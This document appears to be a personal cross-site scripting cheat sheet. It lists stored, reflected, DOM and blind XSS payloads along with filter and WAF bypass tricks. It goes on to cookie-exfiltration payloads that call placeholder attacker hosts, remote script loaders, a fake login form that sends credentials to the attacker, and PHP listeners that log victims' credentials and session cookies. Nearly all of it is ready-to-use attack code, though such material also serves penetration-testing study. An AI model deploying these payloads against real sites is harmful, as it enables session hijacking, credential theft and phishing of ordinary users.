# Stored XSS :

- Basic / no filtering

```js
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```


- When `<script>` gets stripped/blocked

```js
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
```

- Filter/WAF bypass tricks

```js
<img src=x onerror=alert`1`>              <!-- no parens, uses template literal -->
<img src=x OnErRoR=alert(1)>               <!-- case bypass -->
<img/src=x/onerror=alert(1)>               <!-- no spaces -->
<img src=x onerror=alert(document['cookie'])>  <!-- bracket notation avoids dot filters -->
<svg/onload=alert(1)>
<sVg OnLoAd=alert(1)>
"><img src=x onerror=alert(1)>             <!-- breaking out of attribute -->
'-alert(1)-'                               <!-- breaking out of JS string context -->
```

- Attribute context (e.g. injecting into `value="..."`)

```js
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
```

- JS string context (injecting inside an existing `<script>` block)

```js
';alert(1);//
";alert(1);//
</script><script>alert(1)</script>
```

- Real payload — session/cookie exfiltration (what you'd actually use in an engagement, not just alert(1))

```js
<script>fetch('https://YOUR-COLLABORATOR/c?c='+document.cookie)</script>
<img src=x onerror="fetch('https://YOUR-COLLABORATOR/c?c='+encodeURIComponent(document.cookie))">
<script>new Image().src='https://YOUR-COLLABORATOR/c?c='+document.cookie</script>
```


# Reflected XSS 

### Core payloads by context

- No filtering :

```js
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
```

- Reflected into an HTML attribute (e.g. `?search=` reflected into `value="..."`):

```js
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
'><img src=x onerror=alert(1)>
```

- Reflected into JS context (e.g. inside `var x = "USERINPUT";`):

```js
";alert(1);//
</script><script>alert(1)</script>
";alert(document.domain);var a="
```

**Reflected into a URL/href attribute:**

```js
javascript:alert(document.domain)
javascript:alert(document.cookie)
```

### URL-encoding for delivery (this is the reflected-specific part)

- Since it goes in a query string, you need proper encoding:

```js
?q=<script>alert(1)</script>
→ ?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E

?q="><img src=x onerror=alert(1)>
→ ?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

- Double-encoding sometimes bypasses naive WAF decoding:

```js
%253Cscript%253E
```

### Filter/WAF bypass (same tricks apply)

```js
<img src=x OnErRoR=alert(1)>
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img src=x onerror=alert`1`>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>   <!-- base64-encoded alert(1), bypasses keyword filters -->
```

### Practical reflected-specific delivery

- For a real engagement/report, you want a link that proves impact, not just `alert()`:

```html
http://target.com/search?q=<script>fetch('https://YOUR-COLLABORATOR/c?c='+document.cookie)</script>
```

- If it lands in JS context and quotes/parens get filtered:

```javascript
?q="-alert(document.domain)-"
?q=';fetch('https://YOUR-COLLABORATOR/c?c='+document.cookie);//
```

# DOM XSS

```js
<img src="" onerror=alert(window.origin)>
```

# Blind XSS 

```js
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
# getting Creds with XSS 

- creating a malisous login form 

```js
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

- we clean the original items

```js
document.getElementById('urlform').remove();
```

- php listener 

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

- we start the phpserver 

```sh
sudo php -S 0.0.0.0:80
```


# Session Hijacking with Blind XSS

- first we send the admins cookie  using `script.js`  in our vm

```js
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

- the we inject 

```js
"><script src=http://10.10.14.184/script.js></script>
```

- or

```js
<script src=http://OUR_IP/script.js></script>
```


- the php server 

``` php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```



- we can also use https://github.com/s0md3v/xsstrike for automated xss detection

# Other payloads :

- https://github.com/payload-box/xss-payload-list
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md


# Golden Payload :

```js
"><script src=http://IP:PORT/script.js></script>
```